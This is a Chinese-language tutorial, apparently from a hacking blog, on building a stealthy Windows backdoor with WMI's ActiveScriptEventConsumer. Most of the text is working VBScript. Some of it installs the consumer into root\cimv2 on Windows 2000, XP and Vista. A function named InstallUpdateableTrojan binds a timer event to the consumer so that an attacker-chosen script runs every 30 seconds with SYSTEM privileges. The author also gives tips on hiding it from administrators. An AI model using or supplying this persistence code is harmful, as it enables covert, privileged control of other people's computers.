&emsp;&emsp;这个“三无”后门的核心就是WMI中的永久事件消费者ActiveScriptEventConsumer（以下简称ASEC）。WMI中有许多这 类的事件消费者，简单的来说，当与其绑定的事件到达时，消费者就会被触发执行预先定义好的功能。例如可以用来执行二进制程序的 CommandLineEventConsumer等等   
&emsp;&emsp;ASEC是WMI中的一个标准永久事件消费者。它的作用是当与其绑定的一个事件到达时，可以执行一段预先设定好的JS/VBS脚本  
&emsp;&emsp;先来看一下其原型： 
```vbs
class ActiveScriptEventConsumer : __EventConsumer 
{ 
uint8 CreatorSID = {1,1,0,0,0,0,0,5,18,0,0,0}; //事件消费者的CreatorSID 只读 
uint32 KillTimeout = 0; //脚本允许被执行的时间 默认为0，脚本不会被终止 
string MachineName; 
uint32 MaximumQueueSize; 
string Name; //自定义的事件消费者的名字。 
string ScriptingEngine; //用于解释脚本的脚本引擎。VBScript或者JScript 
string ScriptFileName; //如果你想从一个文件里面读取想执行的脚本的话，写上这里吧。 
string ScriptText; //用于执行的脚本代码。与ScriptFileName不共戴天。有你没我，有我没你 
}; 
```
&emsp;&emsp;ASEC的安装   
&emsp;&emsp;对于XP以后的系统来说，ASEC已经默认安装到了root\subscription名称空间。我们可以直接调用。2000自带有ASEC的 mof文件，但是没有默认安装，需要我们自己安装。另外由于大部分的事件都是在root\cimv2里产生，所以如果你想直接捕获一些系统事件作为触发器 的话，还得在其他的名称空间中安装ASEC。来看一下在2000/XP/Vista下安装ASEC到root\cimv2的代码。   
```vbs
Function InstallASECForWin2K ’安装ASEC For Windows 2000’ 
Dim ASECPath2K 
ASECPath2K = XShell.Expandenvironmentstrings("%windir%\system32\wbem\") 
Set MofFile = FSO.opentextfile(ASECPath2K&"scrcons.mof",1,False) 
MofContent = MofFile.Readall 
MofFile.Close 
MofContent = Replace(MofContent,"\\Default","\\cimv2",1,1) ‘替换默认的名称空间 
TempMofFile=ASECPath2K&"Temp.mof" 
Set TempMof=FSO.CreateTextFile(TempMofFile,False,True) 
TempMof.Write MofContent 
TempMof.close 
XShell.run "mofcomp.exe -N:root\cimv2 "&TempMofFile,0,TRUE 
FSO.DeleteFile(TempMofFile) 
ASECStatus = "Ready" 
’Wscript.Echo "ASECForWin2K Install OK!" 
End Function 
Function InstallASECForWinXP ’安装ASEC For Windows XP’ 
Dim ASECPathXP 
XPASECPath = XShell.Expandenvironmentstrings("%windir%\system32\wbem\") 
XShell.run "mofcomp.exe -N:root\cimv2 "&XPASECPath&"scrcons.mof",0,TRUE ’直接运行安装即可 
ASECStatus = "Ready" 
’Wscript.Echo "ASECForWinXP Install OK!" 
End Function 
Function InstallASECForVista ’安装ASEC For Windows Vista’ 
Dim ASECPath2K 
ASECPath2K = XShell.Expandenvironmentstrings("%windir%\system32\wbem\") 
Set f = FSO.GetFile(ASECPath2K&"scrcons.mof") 
Set MofFile = f.OpenAsTextStream(1,-2) 
’Set MofFile = FSO.opentextfile(ASECPath2K&"scrcons.mof",1,False) 
MofContent = MofFile.Readall 
MofFile.Close 
MofContent = Replace(MofContent,"#pragma autorecover","",1,1) //需要删除autorecover，否则安装出错
TempMofFile=ASECPath2K&"Temp.mof" 
Set TempMof=FSO.CreateTextFile(TempMofFile,False,True) 
TempMof.Write MofContent 
TempMof.close 
XShell.run "mofcomp.exe -N:root\cimv2 "&TempMofFile,0,TRUE 
FSO.DeleteFile(TempMofFile) 
ASECStatus = "Ready" 
’Wscript.Echo "ASECForWinVista Install OK!" 
End Function 
```
&emsp;&emsp;再来看一个绑定事件和ASEC的实例。  
```vbs
Function InstallUpdateableTrojan 
WMILink="winmgmts:\\.\root\cimv2:" //ASEC所在的名称空间 
TrojanName="ScriptKids" //自定义的消费者名字，也就是你的后门的名字 
TrojanRunTimer=30000 //自定义的脚本运行间隔 
strtxt="" //自定义的脚本内容。为了隐蔽我们就不用scriptfilename了。会被Windows编码后写入CIM存储库 
’配置事件消费者’ 
set Asec=getobject(WMILink&"ActiveScriptEventConsumer").spawninstance_ 
Asec.name=TrojanName&"_consumer" 
Asec.scriptingengine="vbscript" 
Asec.scripttext=strtxt 
set Asecpath=Asec.put_ 
’配置计时器’ 
set WMITimer=getobject(WMILink&"__IntervalTimerInstruction").spawninstance_ 
WMITimer.timerid=TrojanName&"_WMITimer" 
WMITimer.intervalbetweenevents=TrojanRunTimer 
WMITimer.skipifpassed=false 
WMITimer.put_ 
’配置事件过滤器’ 
set EventFilter=getobject(WMILink&"__EventFilter").spawninstance_ 
EventFilter.name=TrojanName&"_filter" 
EventFilter.query="select * from __timerevent where timerid="""&TrojanName&"_WMITimer""" 
EventFilter.querylanguage="wql" 
set FilterPath=EventFilter.put_ 
’绑定消费者和过滤器’ 
set Binds=getobject(WMILink&"__FilterToConsumerBinding").spawninstance_ 
Binds.consumer=Asecpath.path 
Binds.filter=FilterPath.path 
Binds.put_ 
End Function 
```
&emsp;&emsp;以上代码的含义就是当我们自定义的一个计时器事件发生时，会被我们所配置的事件过滤器捕获到，并触发与过滤器绑定的消费者，也就是我们自定义了脚本的ASEC。达到我们每隔30秒执行一次我们自定义的脚本的目的。很简单吧：）  
&emsp;&emsp;最后要说的是，我们自定义的脚本运行时，是由系统自带的scrcons.exe作为脚本宿主进行解析，而scrcons.exe是由系统以 SYSTEM权限启动的，也就是说，我们的脚本是以SYSTEM权限执行，并且其所创建的任意进程都会继承SYSTEM权限。美中不足的就是，每当脚本执 行时，会平白多出一个scrcons.exe的系统进程。这也是这个脚本后门目前最容易被发现的一个弱点。不过，当这个脚本24小时才运行一次时，有多少 人会注意到呢？